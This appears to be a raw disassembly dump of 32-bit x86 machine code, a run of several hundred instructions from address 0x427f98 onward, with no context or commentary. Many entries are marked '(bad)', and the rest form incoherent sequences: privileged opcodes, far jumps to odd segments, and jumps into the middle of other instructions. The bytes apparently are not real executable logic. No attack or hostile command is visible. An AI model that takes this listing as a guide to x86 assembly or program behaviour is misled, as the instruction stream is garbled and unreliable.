  427f98:	or     BYTE PTR [ecx-0x7a87bb],cl
  427f9e:	jne    0x427f58
  427fa0:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  427faa:	mov    ecx,0xd74fb8
  427faf:	add    cl,al
  427fb1:	mov    DWORD PTR [ecx-0x3f007784],ecx
  427fb7:	or     DWORD PTR [ebx+0x558966ec],0x7e
  427fbe:	(bad)  
  427fbf:	push   ebp
  427fc1:	mov    eax,0x8c2789
  427fc6:	ret    0x6689
  427fc9:	adc    BYTE PTR [ebp+0x4c],0x8d
  427fcd:	add    bl,bl
  427fcf:	mov    WORD PTR [ebp-0x70],ax
  427fd3:	(bad)  
  427fd4:	ret    0x660d
  427fd7:	or     BYTE PTR [ebp-0x77],dl
  427fda:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  427fe1:	in     al,0x89
  427fe3:	(bad)  
  427fe4:	xchg   esi,eax
  427fe5:	aam    0xcf
  427fe7:	call   0x45daf875
  427fec:	dec    edx
  427fed:	pop    ecx
  427fee:	mov    edx,DWORD PTR [eax]
  427ff0:	repnz push bp
  427ff3:	or     BYTE PTR [ebx+0x5510663b],0x49
  427ffa:	(bad)  
  427ffb:	repnz xor eax,0xa0898945
  428001:	mov    ah,0x89
  428003:	jmp    DWORD PTR [edx+0x66b0418d]
  428009:	inc    DWORD PTR [ebp+0x50]
  42800c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428010:	mov    DWORD PTR [eax],ecx
  428012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428013:	pop    es
  428014:	inc    ecx
  428015:	(bad)  
  428016:	cbw    
  428018:	inc    ebp
  428019:	xor    ah,BYTE PTR [esi+0x3]
  42801c:	dec    ebp
  42801d:	push   eax
  42801e:	inc    bp
  428020:	jge    0x427fa5
  428022:	mov    esp,DWORD PTR [esi-0x18]
  428025:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  42802b:	add    DWORD PTR [ebx],esi
  42802d:	add    BYTE PTR [ebx],al
  42802f:	test   DWORD PTR [ebx],esi
  428031:	(bad)  
  428032:	inc    WORD PTR [ebp+0x0]
  428036:	mov    eax,DWORD PTR [eax]
  428038:	call   0x8898376d
  42803d:	mov    esi,eax
  42803f:	clc    
  428040:	ret    
  428041:	rol    cl,0xa
  428044:	mov    DWORD PTR ds:0x7c0ec88,esi
  42804a:	mov    edx,edi
  42804c:	pushf  
  42804d:	pop    es
  42804e:	jmp    FWORD PTR [edx+0x66]
  428051:	add    BYTE PTR [ebp-0x990175],al
  428057:	inc    ebp
  428058:	test   DWORD PTR [ebx-0x2f000202],eax
  42805e:	push   ebp
  42805f:	mov    edi,eax
  428061:	mov    dh,BYTE PTR [eax+0x266ff51]
  428067:	push   ebp
  428068:	add    BYTE PTR [ebx-0x764b1777],al
  42806e:	dec    DWORD PTR [esi+0x661851e8]
  428074:	add    BYTE PTR [ebp-0x7b],dl
  428077:	cmp    esi,0xfffffffb
  42807a:	dec    DWORD PTR [ecx+0x51fe9285]
  428080:	jmp    DWORD PTR [esi-0x75]
  428083:	push   ebp
  428084:	hlt    
  428085:	data16 (bad) 
  428087:	dec    ebp
  428088:	ret    
  428089:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42808f:	lea    edx,[eax-0x1]
  428092:	jne    0x428065
  428094:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42809a:	dec    BYTE PTR [ecx+0x51559eff]
  4280a0:	mov    DWORD PTR [esi-0x4c],esp
  4280a3:	push   ebp
  4280a4:	jmp    DWORD PTR [esi-0x18]
  4280a7:	inc    ebp
  4280a8:	sbb    BYTE PTR [ebp-0x767ae500],cl
  4280ae:	(bad)  
  4280af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280b0:	inc    eax
  4280b2:	test   DWORD PTR [esi-0x2],esp
  4280b5:	inc    ebp
  4280b6:	dec    DWORD PTR [ebp-0x760bde75]
  4280bc:	(bad)  
  4280bd:	test   al,0xc3
  4280bf:	mov    DWORD PTR [ebp-0x769b56],ecx
  4280c5:	lods   al,BYTE PTR ds:[esi]
  4280c6:	push   eax
  4280c7:	inc    ebp
  4280c8:	jne    0x4280d9
  4280ca:	dec    DWORD PTR [ebp+0x8]
  4280cd:	mov    eax,DWORD PTR [edi]
  4280cf:	sbb    al,0x0
  4280d1:	(bad)  
  4280d2:	mov    eax,0xc14fc3
  4280d7:	mov    DWORD PTR [eax-0x64],edi
  4280da:	inc    bp
  4280dc:	test   DWORD PTR [edi],ecx
  4280de:	dec    DWORD PTR [ebp-0x1]
  4280e1:	xor    eax,edi
  4280e3:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4280e9:	inc    ebp
  4280ea:	xor    DWORD PTR [ebx],0x3f
  4280ed:	mov    WORD PTR [ebp-0x1bc],ax
  4280f4:	lea    ecx,[ecx-0x767702]
  4280fa:	inc    esi
  4280fb:	(bad)  
  4280fc:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428103:	pushf  
  428104:	rol    DWORD PTR [ebp-0x72019a],0xff
  42810b:	add    bh,bh
  42810d:	add    BYTE PTR [edi],cl
  42810f:	test   DWORD PTR [eax],eax
  428111:	(bad)  
  428112:	dec    WORD PTR [ebp-0xff002d]
  428119:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42811d:	jmp    DWORD PTR [esi-0x73]
  428120:	lea    esi,[eax+0x50ffffff]
  428126:	fadd   QWORD PTR [ebp+0x0]
  428129:	xor    esp,DWORD PTR [esi+0x3]
  42812c:	lea    edx,[eax-0x1]
  42812f:	test   edi,edi
  428131:	dec    DWORD PTR [ebp-0x1]
  428134:	mov    edi,edi
  428136:	dec    eax
  428137:	clc    
  428138:	call   DWORD PTR [ebp-0x73]
  42813b:	lea    esi,[eax+0x51ffff88]
  428141:	lea    ecx,[ebp-0x78]
  428144:	test   WORD PTR [ebp-0x2],ax
  42814b:	popf   
  42814c:	push   eax
  42814d:	add    BYTE PTR [ecx-0x77],dl
  428150:	xor    edi,DWORD PTR [eax-0x7236007d]
  428156:	cwde   
  428157:	mov    al,0x32
  428159:	inc    DWORD PTR [ebx]
  42815b:	push   eax
  42815c:	push   ecx
  42815d:	inc    ebp
  42815e:	shl    BYTE PTR [ebx],1
  428160:	lea    eax,[ebx]
  428162:	call   DWORD PTR [eax-0x1]
  428165:	test   DWORD PTR [ebx],esi
  428167:	inc    DWORD PTR [eax-0x1]
  42816a:	(bad)  
  42816b:	(bad)  
  42816c:	(bad)  
  42816d:	clc    
  42816e:	call   DWORD PTR [ebp+0x50]
  428171:	jmp    0xcb82eb
  428176:	inc    esp
  428177:	jnp    0x428178
  428179:	add    BYTE PTR [ecx-0x484f73],cl
  42817f:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428185:	mov    eax,DWORD PTR [ecx]
  428187:	data16 add BYTE PTR [ebp-0xb50077],al
  42818e:	inc    eax
  428190:	lea    esp,[esi+0x14]
  428193:	test   DWORD PTR [ecx-0xb301],ecx
  428199:	inc    edi
  42819a:	(bad)  
  42819b:	dec    si
  42819d:	test   edi,edi
  42819f:	(bad)  
  4281a0:	cmp    eax,0xc74f73ff
  4281a5:	mov    edx,DWORD PTR [edx-0x7d]
  4281a8:	push   DWORD PTR [ebx+0x56328939]
  4281ae:	(bad)  
  4281af:	call   FWORD PTR [esi-0x47]
  4281b2:	inc    DWORD PTR ds:0x893c00ea
  4281b8:	(bad)  
  4281b9:	pop    eax
  4281ba:	mov    ah,0xff
  4281bc:	(bad)  
  4281bd:	mov    ecx,0x5745
  4281c2:	dec    DWORD PTR [ecx-0xf7a501]
  4281c8:	(bad)  
  4281c9:	mov    ecx,0x456108
  4281ce:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4281d4:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4281da:	inc    BYTE PTR gs:[eax]
  4281dd:	inc    DWORD PTR [ebp-0x73]
  4281e0:	cmp    dh,bh
  4281e2:	pushf  
  4281e3:	inc    edi
  4281e5:	mov    ebx,eax
  4281e7:	hlt    
  4281e8:	test   DWORD PTR [ecx-0xbab708],ecx
  4281ee:	cmp    al,0xbe
  4281f0:	pushf  
  4281f1:	or     bh,al
  4281f3:	pop    es
  4281f4:	lock into 
  4281f6:	test   eax,eax
  4281f8:	clc    
  4281f9:	mov    ebx,0x387245
  4281fe:	lahf   
  4281ff:	retf   
  428200:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428206:	add    edi,edi
  428208:	add    BYTE PTR [ecx+0x45],dl
  42820b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428212:	mov    edx,DWORD PTR [ecx-0x74]
  428215:	inc    DWORD PTR [eax]
  428217:	cld    
  428218:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42821e:	add    BYTE PTR [ebp-0x1b0177],al
  428224:	jge    0x42826b
  428226:	test   DWORD PTR [ebx+0xff9875],ecx
  42822c:	sbb    BYTE PTR [esi+0x55],ah
  42822f:	xchg   ebp,eax
  428230:	call   0x427d34
  428235:	push   edi
  428236:	inc    ebp
  428237:	mov    dx,WORD PTR [ebp-0xfc0075]
  42823e:	cmp    al,0x85
  428240:	ud0    eax,DWORD PTR [ebp-0x1]
  428244:	test   DWORD PTR [edi+0x74],ecx
  428247:	dec    edi
  428248:	inc    DWORD PTR [ebp-0xf70004]
  42824e:	dec    DWORD PTR [edi-0x75]
  428251:	dec    edi
  428252:	cld    
  428253:	test   DWORD PTR [eax+0xff01ff],eax
  428259:	icebp  
  42825a:	add    BYTE PTR [edi-0x3a],cl
  42825d:	test   ebx,eax
  42825f:	inc    BYTE PTR [ebp-0x1]
  428262:	jne    0x428264
  428264:	mov    eax,DWORD PTR [eax]
  428266:	cld    
  428267:	xor    BYTE PTR [ecx+0x500155],cl
  42826d:	push   ebp
  42826e:	xor    DWORD PTR [ecx+0x45011c80],ecx
  428274:	add    BYTE PTR [ebp+0x35e90f50],al
  42827a:	add    al,BYTE PTR [eax]
  42827c:	add    BYTE PTR [ebx-0x38fe4f80],al
  428282:	add    ah,ch
  428284:	or     BYTE PTR [ebp+0x4501f845],dh
  42828a:	jmp    0xde8587
  42828f:	(bad)  
  428290:	nop    ecx
  428293:	test   DWORD PTR [ebp+0x4502f8],eax
  428299:	cmp    cl,BYTE PTR [ebp-0x64]
  42829c:	mov    eax,edi
  42829e:	mov    ebx,DWORD PTR [eax+edx*2]
  4282a1:	add    eax,0x45fef885
  4282a6:	dec    DWORD PTR [ebx+0x339445]
  4282ac:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4282b2:	dec    DWORD PTR [ebx-0x460f0375]
  4282b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282b9:	add    esi,edi
  4282bb:	add    bh,bh
  4282bd:	rdpmc  
  4282bf:	add    BYTE PTR [ebx],0x1
  4282c2:	mov    DWORD PTR [eax],eax
  4282c4:	add    al,0x45
  4282c6:	dec    DWORD PTR [ecx-0x360b3373]
  4282cc:	dec    DWORD PTR [esi]
  4282ce:	push   eax
  4282cf:	jne    0x428316
  4282d1:	mov    esi,DWORD PTR [ebx]
  4282d3:	cld    
  4282d4:	add    ebp,ebx
  4282d6:	push   eax
  4282d7:	inc    DWORD PTR [ebp-0x75]
  4282da:	add    eax,0x800e4
  4282df:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4282e5:	mov    DWORD PTR [ecx],eax
  4282e7:	sbb    al,0x0
  4282e9:	leave  
  4282ea:	test   DWORD PTR [edi-0x2],eax
  4282ed:	jne    0x4282ee
  4282ef:	call   0xff436df4
  4282f4:	xor    BYTE PTR [ebp+0x4d],al
  4282f7:	mov    edi,edi
  4282f9:	enter  0x8,0x4d
  4282fd:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428303:	mov    eax,DWORD PTR [eax]
  428305:	cld    
  428306:	add    DWORD PTR [ecx],ebx
  428308:	inc    ebp
  428309:	dec    ebp
  42830a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428310:	inc    eax
  428311:	dec    DWORD PTR [ecx-0x270375]
  428317:	add    BYTE PTR [ebx-0x39d72701],cl
  42831d:	xchg   ecx,eax
  42831e:	ret    
  42831f:	add    BYTE PTR [ebp-0x830075],al
  428325:	add    BYTE PTR [ebp-0x75],al
  428328:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  42832e:	lea    edi,[edi-0xc]
  428331:	add    bh,bh
  428333:	mov    edx,DWORD PTR [eax-0x7b]
  428336:	inc    ebp
  428337:	rdpmc  
  428339:	jne    0x42833e
  42833b:	add    BYTE PTR [eax-0x75],dl
  42833e:	inc    ebp
  42833f:	clc    
  428340:	add    eax,0x400009
  428345:	mov    DWORD PTR [ebx-0x7f000304],ecx
  42834b:	mov    eax,DWORD PTR [ecx]
  42834d:	in     al,dx
  42834e:	add    dh,al
  428350:	test   ebx,eax
  428352:	inc    BYTE PTR [ebp-0xff0001]
  428358:	add    BYTE PTR [ebp-0x43],al
  42835b:	cmp    esi,0xfffffff8
  42835e:	(bad)  
  42835f:	push   DWORD PTR [eax]
  428361:	add    BYTE PTR [ebp-0x3a],dl
  428364:	test   ebx,eax
  428366:	je     0x4282ed
  428368:	mov    edi,edi
  42836a:	sbb    al,0xff
  42836c:	test   DWORD PTR gs:[eax],eax
  42836f:	(bad)  
  428370:	js     0x428371
  428372:	add    BYTE PTR [ebx-0x39b20bdd],cl
  428378:	sub    eax,ebx
  42837a:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428380:	add    eax,DWORD PTR [eax]
  428382:	dec    ebp
  428383:	push   eax
  428384:	mov    al,BYTE PTR [ebp+0x1]
  428387:	mov    eax,DWORD PTR [ebp-0x68]
  42838a:	mov    eax,DWORD PTR [eax]
  42838c:	sbb    bh,al
  42838e:	or     ah,dh
  428390:	dec    ebp
  428391:	inc    DWORD PTR [eax+0x4]
  428394:	push   ecx
  428395:	add    BYTE PTR [edx-0x1],dh
  428398:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42839e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4283a8:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4283ae:	push   ecx
  4283af:	cmp    BYTE PTR [ebx],al
  4283b1:	inc    ebp
  4283b2:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4283b8:	(bad)  
  4283b9:	(bad)  
  4283ba:	in     al,0xff
  4283bc:	add    BYTE PTR [ebp+0x0],al
  4283bf:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4283c5:	add    al,bh
  4283c7:	(bad)  
  4283c8:	jmp    0x8d85:0x74b0558d
  4283cf:	dec    DWORD PTR [eax]
  4283d1:	call   DWORD PTR [ebp-0x7b]
  4283d4:	mov    edi,esi
  4283d6:	lock call DWORD PTR [ebp-0x75]
  4283da:	mov    esi,esp
  4283dc:	mov    ah,0xc6
  4283de:	mov    bh,0xc3
  4283e0:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4283e6:	add    DWORD PTR [eax],0x450050ff
  4283ec:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4283f2:	inc    edi
  4283f4:	push   esp
  4283f6:	jmp    0xcd00:0x680481ff
  4283fd:	mov    DWORD PTR [ebx],esi
  4283ff:	clc    
  428400:	cmp    edi,0xff9cff3b
  428406:	jne    0x428410
  428408:	mov    eax,eax
  42840a:	add    esi,DWORD PTR [eax]
  42840c:	int3   
  42840d:	inc    ebp
  42840e:	cmp    al,0x83
  428410:	add    BYTE PTR [eax],bl
  428412:	adc    DWORD PTR [ebx+0x768b5055],eax
  428418:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42841e:	mov    edi,eax
  428420:	cmp    BYTE PTR [ebp+0x45],cl
  428423:	jmp    0x4283b0
  428425:	mov    ebx,DWORD PTR [esp+ebp*8]
  428428:	inc    ebp
  428429:	or     al,0x2
  42842b:	dec    DWORD PTR [ebp+0x18]
  42842e:	jne    0x428485
  428430:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  428436:	mov    edi,DWORD PTR [ebx]
  428438:	in     al,0x50
  42843a:	xchg   ecx,eax
  42843b:	jmp    0x342d340
  428440:	adc    al,0x8b
  428442:	inc    ebp
  428443:	mov    al,ds:0x8b04008b
  428448:	push   ebp
  428449:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  42844f:	push   ebp
  428450:	test   DWORD PTR [ebx-0x2800d701],ecx
  428456:	inc    ebp
  428457:	dec    ebp
  428458:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  42845e:	mov    DWORD PTR [eax],0xe9ff00f4
  428464:	add    al,0x0
  428466:	add    BYTE PTR [eax],al
  428468:	mov    eax,edx
  42846a:	push   eax
  42846b:	rol    DWORD PTR [ebp-0xf0177],1
  428471:	bound  eax,QWORD PTR [ebp+0x50]
  428474:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  42847a:	add    BYTE PTR [ecx+0x558df0ff],cl
  428480:	mov    al,0xf
  428482:	test   DWORD PTR [edx],edx
  428484:	call   DWORD PTR [ebp-0x7a0001]
  42848a:	(bad)  
  42848b:	loop   0x42848c
  42848d:	jnp    0xc6987893
  428493:	mov    eax,ebx
  428495:	cmp    al,0x8b
  428497:	(bad)  
  428498:	cld    
  428499:	shr    esi,0xc
  42849c:	add    dl,al
  42849e:	push   eax
  42849f:	lea    eax,[ebp-0x1]
  4284a2:	mov    edx,esi
  4284a4:	cwde   
  4284a5:	cli    
  4284a6:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4284ac:	or     BYTE PTR [eax],cl
  4284ae:	inc    ebp
  4284af:	dec    ebp
  4284b0:	inc    DWORD PTR [ebx+0x74803914]
  4284b6:	add    DWORD PTR [ebx+0x451800],ecx
  4284bc:	call   DWORD PTR [eax+edx*1]
  4284bf:	add    ecx,DWORD PTR [ebp-0x34]
  4284c2:	push   edi
  4284c3:	adc    al,0x8
  4284c5:	mov    edx,DWORD PTR [ebp-0x14]
  4284c8:	mov    ecx,DWORD PTR [ebp+0x18]
  4284cb:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4284cf:	inc    DWORD PTR [eax+esi*8]
  4284d2:	inc    ebp
  4284d3:	stos   BYTE PTR es:[edi],al
  4284d4:	mov    edx,DWORD PTR [ebp-0x4]
  4284d7:	add    DWORD PTR [ebp-0x1c],eax
  4284da:	mov    edx,DWORD PTR [ebp-0x70]
  4284dd:	cmp    eax,DWORD PTR [eax]
  4284df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284e0:	mov    eax,DWORD PTR [eax]
  4284e2:	cld    
  4284e3:	jae    0x428465
  4284e5:	add    eax,DWORD PTR [ecx]
  4284e7:	clc    
  4284e8:	add    BYTE PTR [eax+0x30],dl
  4284eb:	mov    DWORD PTR [ecx],esi
  4284ed:	clc    
  4284ee:	pop    ds
  4284ef:	inc    ebp
  4284f0:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4284f6:	(bad)  
  4284f7:	push   DWORD PTR [edi]
  4284f9:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4284ff:	(bad)  
  428500:	jae    0x428501
  428502:	mov    eax,DWORD PTR [ebp-0x740175]
  428508:	sub    eax,DWORD PTR [eax]
  42850a:	add    eax,DWORD PTR [eax]
  42850c:	mov    DWORD PTR [ecx+0x5f],eax
  42850f:	mov    DWORD PTR [ebx-0x4],ebx
  428512:	ret    0xff
  428515:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42851b:	ret    
  42851c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  428522:	add    BYTE PTR [ebp-0x7d],al
  428525:	mov    DWORD PTR [eax],eax
  428527:	add    al,0x84
  428529:	inc    DWORD PTR [ecx]
  42852b:	lea    eax,[eax]
  42852d:	hlt    
  42852e:	sar    bh,cl
  428530:	test   BYTE PTR [eax+0x1],dl
  428533:	inc    ebp
  428534:	add    BYTE PTR [ebx],dh
  428536:	test   BYTE PTR [ebx],0x84
  428539:	push   eax
  42853a:	add    BYTE PTR [ebp+0x0],al
  42853d:	add    eax,0x86
  428542:	add    BYTE PTR [ebx-0x7f7b0340],cl
  428548:	add    BYTE PTR [ecx],al
  42854a:	add    BYTE PTR [eax],al
  42854c:	mov    esi,0x550030
  428551:	mov    ecx,DWORD PTR [edi]
  428553:	cld    
  428554:	fidiv  DWORD PTR [ebp+0x0]
  428557:	mov    edi,DWORD PTR [ecx]
  428559:	xor    BYTE PTR [eax+eax*1],0x84
  42855d:	add    eax,DWORD PTR [eax]
  42855f:	sbb    BYTE PTR [eax],al
  428561:	jne    0x428514
  428563:	mov    eax,DWORD PTR [ecx]
  428565:	sbb    BYTE PTR [eax],al
  428567:	mov    DWORD PTR [ebp-0x1],esp
  42856a:	add    BYTE PTR [eax+0x30e45ca],bh
  428570:	ret    0xb7fc
  428573:	dec    ebp
  428574:	or     al,0x89
  428576:	dec    ebp
  428577:	cld    
  428578:	cmovne ecx,DWORD PTR [eax-0x75]
  42857c:	add    edi,esp
  42857e:	seto   BYTE PTR [esi-0x72ffffff]
  428585:	inc    ebp
  428586:	adc    al,0x8b
  428588:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  42858f:	cmp    DWORD PTR [edi+0x72],edx
  428592:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428598:	gs cmp al,0x0
  42859b:	je     0x428573
  42859d:	push   eax
  42859e:	sar    BYTE PTR [eax],1
  4285a0:	mov    bh,0x3e
  4285a2:	push   cs
  4285a3:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4285a9:	add    DWORD PTR [ecx+0x12],ebp
  4285ac:	dec    edx
  4285ad:	(bad)  
  4285ae:	mov    eax,edx
  4285b0:	in     al,dx
  4285b1:	adc    DWORD PTR [ecx],esi
  4285b3:	pop    esi
  4285b4:	inc    ecx
  4285b5:	leave  
  4285b6:	or     DWORD PTR [eax],ebx
  4285b8:	gs push ebp
  4285ba:	add    ah,ch
  4285bc:	into   
  4285bd:	in     al,dx
  4285be:	enter  0xb756,0xf0
  4285c2:	push   cs
  4285c3:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4285cd:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4285d3:	jnp    0x74430adb
  4285d9:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4285df:	add    BYTE PTR [edi],cl
  4285e1:	mov    edi,DWORD PTR [ecx-0x78]
  4285e4:	ltr    WORD PTR [ecx-0x7b]
  4285e8:	dec    DWORD PTR [edi]
  4285ea:	clc    
  4285eb:	out    0x45,eax
  4285ed:	add    BYTE PTR [eax],cl
  4285ef:	cmp    ebx,0xffffff8c
  4285f2:	jge    0x4285f4
  4285f4:	jb     0x428606
  4285f6:	je     0x518676
  4285fc:	pop    edx
  4285fd:	push   esi
  4285fe:	mov    ecx,DWORD PTR [edi]
  428600:	in     al,dx
  428601:	rol    DWORD PTR [ebp+0x0],1
  428604:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  42860b:	cmp    DWORD PTR [ecx],0xfffffff0
  42860e:	hlt    
  42860f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428615:	(bad)  
  428617:	push   eax
  428618:	jns    0xb8426a96
  42861e:	lock push cs
  428620:	ror    edx,0x3
  428623:	test   BYTE PTR [ecx+0x5500e800],cl
  428629:	dec    eax
  42862a:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  42862e:	(bad)  
  42862f:	mov    esi,0x7f33ff5f
  428634:	inc    eax
  428635:	test   DWORD PTR [edx],eax
  428637:	je     0x4285f9
  428639:	mov    ecx,ecx
  42863b:	adc    DWORD PTR [ebp-0xc],0xffffffec
  42863f:	and    eax,DWORD PTR [eax+0xf0103]
  428645:	jp     0x428633
  428647:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  42864b:	add    edx,DWORD PTR [edi+0x74]
  42864e:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428654:	add    BYTE PTR [ebp-0x74c48bbb],al
  42865a:	je     0x4285df
  42865c:	cmp    eax,edi
  42865e:	js     0x428683
  428660:	add    eax,0xeb0fc003
  428665:	jns    0x4285f2
  428667:	vmread DWORD PTR [ecx+0x45],ebx
  42866b:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428671:	adc    al,0x8b
  428673:	jge    0x428689
  428675:	mov    edi,DWORD PTR [eax-0x4]
  428678:	add    edi,DWORD PTR [edi]
  42867a:	or     bh,bh
  42867c:	push   ebp
  42867d:	push   es
  42867e:	mov    DWORD PTR [ebp-0x4],ebx
  428681:	add    edi,esi
  428683:	pop    es
  428684:	add    esi,DWORD PTR [edi-0x48ccf183]
  42868a:	mov    DWORD PTR [esp+esi*8],ecx
  42868d:	inc    ebp
  42868e:	pop    ebp
  42868f:	xor    DWORD PTR [esi-0x4],0x3b
  428693:	add    edx,DWORD PTR [ecx+edi*1]
  428696:	push   es
  428697:	clc    
  428698:	mov    bh,0xdb
  42869a:	jp     0x428653
  42869c:	add    cl,BYTE PTR [esi]
  42869e:	div    DWORD PTR [edi+0x4d8b0c1c]
  4286a4:	test   edi,edi
  4286a6:	je     0x42869c
  4286a8:	mov    eax,ecx
  4286aa:	or     BYTE PTR [ebx],al
  4286ac:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4286b2:	jbe    0x428726
  4286b4:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4286ba:	add    ecx,DWORD PTR [esi]
  4286bc:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4286c2:	add    eax,DWORD PTR [ebx-0x287af783]
  4286c8:	je     0x428717
  4286ca:	mov    DWORD PTR [ecx],edi
  4286cc:	mov    esi,eax
  4286ce:	hlt    
  4286cf:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4286d6:	jb     0x428698
  4286d8:	jmp    0x4286c5
  4286da:	xor    esi,DWORD PTR [ebx]
  4286dc:	pop    edi
  4286dd:	pop    esi
  4286de:	pop    ebx
  4286df:	ret    
  4286e0:	ret    0x8b
  4286e3:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4286e9:	cmp    DWORD PTR [eax],0xc
  4286ec:	pushf  
  4286ed:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4286f3:	(bad)  
  4286f5:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  4286fc:	dec    ebp
  4286fd:	ret    
  4286fe:	mov    edi,DWORD PTR [esi-0x4]
  428701:	pop    eax
  428702:	dec    ebp
  428703:	jne    0x428690
  428705:	xor    edi,esp
  428707:	inc    eax
  428708:	dec    ebp
  428709:	jbe    0x42875e
  42870b:	inc    eax
  42870c:	pop    ebp
  42870d:	add    edx,DWORD PTR [esi+0x8]
  428710:	push   eax
  428711:	dec    eax
  428712:	push   ecx
  428713:	mov    eax,edi
  428715:	and    al,0xf0
  428717:	jo     0x428704
  428719:	mov    eax,DWORD PTR [ebx]
  42871b:	sbb    BYTE PTR [ebp+0x4d],cl
  42871e:	mov    eax,DWORD PTR [ebx]
  428720:	nop
  428721:	or     BYTE PTR [eax],al
  428723:	jne    0x42877c
  428725:	cmp    ebx,DWORD PTR [eax+0x33893277]
  42872b:	cld    
  42872c:	xor    edi,edi
  42872e:	add    edi,DWORD PTR [ebp+0x3]
  428731:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428737:	js     0x4286bd
  428739:	jae    0x42873d
  42873b:	(bad)  
  42873d:	xor    al,0x5d
  42873f:	jmp    0x4286cc
  428741:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428748:	fdecstp 
  42874a:	test   BYTE PTR [edi],ah
  42874c:	add    bh,BYTE PTR [ebp+0x0]
  42874f:	add    ebx,DWORD PTR [ebp-0x77]
  428752:	mov    edi,eax
  428754:	cmp    al,0x0
  428757:	adc    dh,BYTE PTR [ebx]
  428759:	jge    0x42875e
  42875b:	mov    edi,DWORD PTR [ebx]
  42875d:	jl     0x42876e
  42875f:	clc    
  428760:	dec    edi
  428761:	jge    0x428763
  428763:	mov    eax,DWORD PTR [ebx]
  428765:	jb     0x42876f
  428767:	mov    ecx,DWORD PTR [ebp-0x8]
  42876a:	mov    edi,edi
  42876c:	xor    edx,DWORD PTR [eax]
  42876e:	add    edi,DWORD PTR [ebx]
  428770:	mov    DWORD PTR [ebp-0x10],edi
  428773:	inc    edi
  428774:	pop    ebp
  428775:	jge    0x4287b2
  428777:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  42877b:	mov    edx,0xc05d87f0
  428780:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428784:	fimul  WORD PTR [eax]
  428786:	fist   WORD PTR [ebp+0x1c]
  428789:	in     al,dx
  42878a:	jne    0x428778
  42878c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428792:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428796:	fdivp  st(0),st
  428798:	fild   WORD PTR [ebp+0x4510f85c]
  42879e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  4287a4:	inc    ebp
  4287a5:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  4287ab:	mov    ebp,DWORD PTR [ebx-0x4]
  4287ae:	adc    al,0x8b
  4287b0:	rcl    DWORD PTR [eax],0x48
  4287b3:	mov    esi,0x7080803
  4287b8:	fiadd  WORD PTR [ebp+0x4d]
  4287bb:	mov    cs,WORD PTR [ebx+0x558bfc52]
  4287c1:	cld    
  4287c2:	xor    ebx,DWORD PTR [ebx+0x330103]
  4287c8:	mov    DWORD PTR [edi+0x872dc],edi
  4287ce:	xlat   BYTE PTR ds:[ebx]
  4287cf:	into   
  4287d0:	ffreep st(6)
  4287d2:	retf   0x6c7
  4287d5:	iret   
  4287d6:	dec    ebp
  4287d7:	inc    ebp
